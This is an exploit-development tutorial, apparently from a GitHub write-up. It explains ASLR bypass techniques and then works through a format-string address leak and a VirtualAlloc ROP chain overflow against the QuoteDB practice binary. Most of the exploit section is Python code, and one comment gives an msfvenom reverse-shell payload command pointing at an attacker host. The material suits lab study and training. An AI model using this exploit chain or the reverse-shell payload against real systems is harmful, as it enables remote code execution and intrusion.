## Bypassing ASLR

## What is ASLR?

Address Space Layout Randomization (ASLR) is a security feature in modern operating systems, including Windows, designed to prevent attackers from predicting the locations of executable code and data in memory. It randomizes the memory addresses used by system and application files each time they’re loaded. The goal is to make it difficult for attackers to execute exploits that rely on predictable memory locations, such as Return-Oriented Programming (ROP) attacks or buffer overflows.

Despite the protection ASLR provides, there are techniques that attackers use to bypass it:

### 1. **Information Leakage**
   - **Description**: An information leak occurs when an attacker is able to get access to an address or offset in the memory space, allowing them to infer the locations of other parts of the memory layout.
   - **Method**: By exploiting functions or vulnerabilities that unintentionally expose memory addresses (e.g., through verbose error messages, function return values, or improperly cleared debug data), an attacker can calculate the location of certain memory regions.
   - **Example**: Leaking the address of a DLL (Dynamic Link Library) in memory gives an attacker a fixed base address for that DLL, which might help in crafting an exploit for a function within the DLL.

### 2. **DLL and Module Reuse**
   - **Description**: Some modules or DLLs may not have ASLR enabled. If an attacker finds a predictable library that does not use ASLR, they can utilize it to predict certain memory addresses.
   - **Method**: The attacker searches for DLLs loaded into memory without ASLR protection (such as older libraries or third-party DLLs that were compiled without ASLR support). By finding these static libraries, they can create ROP chains or jump to specific functions.
   - **Example**: If a DLL like `kernel32.dll` (in earlier versions without ASLR) is loaded into a predictable location, an attacker can use its fixed location to perform malicious activities.

### 3. **Brute Forcing**
   - **Description**: In some cases, attackers can brute-force the randomized memory addresses to guess the locations of certain modules.
   - **Method**: Although ASLR randomizes memory locations, the range of randomized addresses may be limited, allowing an attacker to guess an address by brute-forcing it through repeated attacks. This is particularly effective in processes that restart often.
   - **Example**: In Windows services that automatically restart after crashes, an attacker might repeatedly guess locations until they find the correct one, leading to a successful attack.

### 4. **Heap Spraying and Memory Spraying**
   - **Description**: Memory spraying techniques involve filling memory with repeated patterns to increase the likelihood of hitting the target addresses.
   - **Method**: The attacker injects data, often NOP sleds (no-operation instructions), into memory to control the contents at predictable locations. If the attacker’s payload lands on a location near the target, it can lead to successful code execution despite ASLR.
   - **Example**: In JavaScript exploits for browsers, attackers may fill the memory with shellcode in a predictable way, increasing the chances of an exploit succeeding despite ASLR.

### 5. **Return-Oriented Programming (ROP) Chains**
   - **Description**: ROP is a technique that uses short snippets of existing code (called "gadgets") in executable memory to carry out an attacker’s instructions without injecting new code.
   - **Method**: By chaining together gadgets in a specific order, attackers can execute a series of commands. If they can find gadgets in non-randomized modules or leak enough addresses, they can bypass ASLR by chaining those addresses into a ROP exploit.
   - **Example**: An attacker might leak the address of one function in a library, then search that library for gadgets to build their exploit.

### 6. **Partial ASLR Implementation in 32-bit Systems**
   - **Description**: ASLR on 32-bit systems has limitations due to the reduced address space. As a result, the randomization is less effective compared to 64-bit systems.
   - **Method**: The attacker can take advantage of the smaller address space on a 32-bit system, as the possible randomized locations are fewer and may be predictable under certain conditions.
   - **Example**: Many attacks on 32-bit applications rely on the fact that the memory space can only be randomized to a certain degree, making brute-forcing techniques more feasible.

### 7. **JIT-Spray (Just-In-Time Spraying)**
   - **Description**: This attack targets Just-In-Time (JIT) compilers, like those found in JavaScript engines, which can inadvertently create predictable code structures in memory.
   - **Method**: Attackers write specific code patterns in JavaScript or other JIT-compiled code, which the JIT compiler translates into predictable machine code. This can lead to a more stable memory layout for the attacker, making ASLR less effective.
   - **Example**: In a web browser, JIT-spraying could allow an attacker to use predictable code in memory that they can later jump to during an exploit.

Despite its limitations, ASLR remains an important defense mechanism. Combining ASLR with these additional security measures can make exploitation significantly more challenging.

## How to Exploit

Let's put by example a binary created by `bmdyy` --> https://github.com/bmdyy

You can download the "QuoteDB" binary with DEP and ASLR here --> https://github.com/bmdyy/quote_db/releases/download/1.00/QuoteDB.exe

### Let's Hack!

We have the following template to start:

```py
import socket
from struct import pack, unpack

server = "127.0.0.1"
port = 3700

def send(opcode, data):
    buf  = pack("<L", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None
```

All modules are compiled with ASLR so we have to reverse the binary to find a memory leak or something like that.

We will use IDA free version.

We see an interesting function called "_handle_connection", we are going to check it. We have three interesting functions inside it, "_get_quote", "_add_quote", and "_log_bad_request".

![image](https://github.com/user-attachments/assets/122055cf-f346-4be5-87e9-fc0be6ea244d)

![image](https://github.com/user-attachments/assets/9f6e7c3e-5c3b-4cc4-8f80-5ee337a03d31)

![image](https://github.com/user-attachments/assets/4fdf2aed-2b51-4805-b72b-5a7a6ea55235)

And the body of each function:

![image](https://github.com/user-attachments/assets/2ab5d72d-4e90-44f8-b24f-55489d8044a7)

![image](https://github.com/user-attachments/assets/2ff02404-0b9b-44a4-94a1-b4c83300ea26)

![image](https://github.com/user-attachments/assets/11325456-3409-4dea-ad51-8152c9d1ca0d)

It seems that we can add a quote to the database with the "_add_quote" function, that return us the index of the quote created. Then, we can check the quote with the index returned and with the function "_get_quote". And finally, after leaking an address with these two functions, we can abuse the overflow vulnerability at "_log_bad_request" function. Let's do that.

We add the three following functions to our python code:

```py
def get_quote(index):
    return send(901, pack("<L", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)
```

And we try to leak the base address:

```py
def leak_base_address():
    print("[+] Leaking address...\n")

    quote_id = unpack("<L", add_quote(b"%x " * 30))[0]
    base_str = get_quote(quote_id).split(b" ")[2].decode()
    base = (int(base_str, 16) // 0x10000) * 0x10000

    print("Your base address is --> " + hex(base))
    return base
```

### Explanation of Each Part

#### quote_id = unpack("<L", add_quote(b"%x " * 30))[0]
This function call likely sends a formatted string ("%x " * 30, which is 30 instances of the format specifier %x ) as input to a vulnerable function in the target program.
    %x is used in printf-style formatting to print hexadecimal values. By sending %x repeatedly, the exploit is likely trying to leak information from the stack by printing memory addresses that are higher up on the stack frame.
    The return value of add_quote is then passed to unpack("<L", ...), which interprets the data as a 4-byte little-endian long integer (indicated by "<L").
    unpack returns a tuple, and [0] extracts the first element, which is saved as quote_id. This value is probably a reference or identifier for the added "quote" and is later used to retrieve the quote.

#### base_str = get_quote(quote_id).split(b" ")[2].decode()

get_quote(quote_id) retrieves the previously added "quote" based on quote_id. The quote returned is presumably a string of leaked memory addresses.
    .split(b" ")[2] splits this retrieved data by spaces and selects the third element ([2]), which contains the hexadecimal address the exploit is interested in.
    .decode() converts this byte string to a regular string for easier handling.

#### base = (int(base_str, 16) // 0x10000) * 0x10000

int(base_str, 16) converts base_str (a hexadecimal string) into an integer.
    The exploit then "aligns" this address to the nearest 0x10000 (64 KB) boundary. ASLR generally randomizes addresses but often keeps them aligned to predictable boundaries, such as 64 KB.
    The formula (int(base_str, 16) // 0x10000) * 0x10000 effectively rounds down the address to the nearest 0x10000 boundary, which is likely the base address of the module or executable.

### Exploiting the Binary

The size we use for crashing is "3000", and the offset to overwrite the "eip" is "2064". We are going to use "VirtualAlloc" in this case. The structure of that function is the following:

```
LPVOID WINAPI VirtualAlloc(
 _In_opt_ LPVOID lpAddress,
 _In_ SIZE_T dwSize,
 _In_ DWORD flAllocationType,
 _In_ DWORD flProtect
);
```

And we use the following skeleton:

```py
va = pack("<L", (0x45454545))       # dummy VirutalAlloc Address
va += pack("<L", (0x46464646))      # Shellcode Return Address
va += pack("<L", (0x47474747))      # dummy Shellcode Address
va += pack("<L", (0x48484848))      # dummy dwSize
va += pack("<L", (0x49494949))      # dummy flAllocationType
va += pack("<L", (0x51515151))      # dummy flProtect
```

Finally we write the ROP chain explaining each step:

```py
def exploit():
    base = leak_base_address()

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.23 LPORT=4444 EXITFUNC=thread -f python -v shell
    shell = b""

    # LPVOID WINAPI VirtualAlloc(
    #   _In_opt_ LPVOID lpAddress,
    #   _In_ SIZE_T dwSize,
    #   _In_ DWORD flAllocationType,
    #   _In_ DWORD flProtect
    # );

    va = pack("<L", (0x45454545))       # dummy VirutalAlloc Address
    va += pack("<L", (0x46464646))      # Shellcode Return Address
    va += pack("<L", (0x47474747))      # dummy Shellcode Address
    va += pack("<L", (0x48484848))      # dummy dwSize
    va += pack("<L", (0x49494949))      # dummy flAllocationType
    va += pack("<L", (0x51515151))      # dummy flProtect

    rop = [
# 1. Get ESP (in eax)
        base + 0x25c0, # xor eax, eax ; ret
        base + 0x1e69, # or eax, esp ; ret

# 2. Get dummy call addr (in ebx)
        base + 0x2b38, # pop ecx ; ret
        0x1ec, # eax + ? = dummy call
        base + 0x9b36, # add eax, ecx ; pop ebx ; ret
        0xffffffff, # junk for pop ebx
        base + 0x1e73, # mov ebx, eax ; ret

# 3. Deref virtualAlloc (in eax)
        base + 0x2b37, # pop eax ; pop ecx ; ret
        base + 0x43218, # base + iat + virtualalloc
        0xffffffff, # junk for pop ecx
        base + 0x1e6c, # mov eax, [eax] ; add ecx, 0x5 ; pop edx ; ret
        0xffffffff, # junk for pop edx

# 4. Write virtual alloc to dummy
        base + 0x1e7a, # mov [ebx], eax ; ret

# 5. Get shellcode addr (in eax)
        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
        base + 0x2cec, # mov eax, edx ; ret
        base + 0x2b38, # pop ecx ; ret
        0x18, # eax + ? = dummy call
        base + 0x9b36, # add eax, ecx ; pop ebx ; ret
        0xffffffff, # junk for pop ebx
        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret

# 6. Get dummy call addr + 0x4 (in ebx)
        base + 0x1e82, # add ebx, 0x4 ; ret

# 7. Write shellcode addr to dummy + 0x4
        base + 0x1e7a, # mov [ebx], eax ; ret

# 8. Get dummy call addr + 0x8 (in ebx)
        base + 0x1e82, # add ebx, 0x4 ; ret

# 9. Write shellcode addr to dummy + 0x8
        base + 0x1e7a, # mov [ebx], eax ; ret

# 10. Align esp with dummy call (ebx-8)
        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
        base + 0x2b38, # pop ecx ; ret
        0xfffffff8, # edx + ? = dummy call
        base + 0x1e86, # add edx, ecx ; ret
        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
        base + 0x1e76, # xchg ebx, esp ; dec ecx ; ret
    ]
    rop = b"".join([pack("<L", r) for r in rop])

    filler = b"A" * (offset - len(va))
    padding = b"C" * (crash_len - len(filler + va + rop + shell))

    buf = filler + va + rop + shell + padding

    bad_request(buf)
```
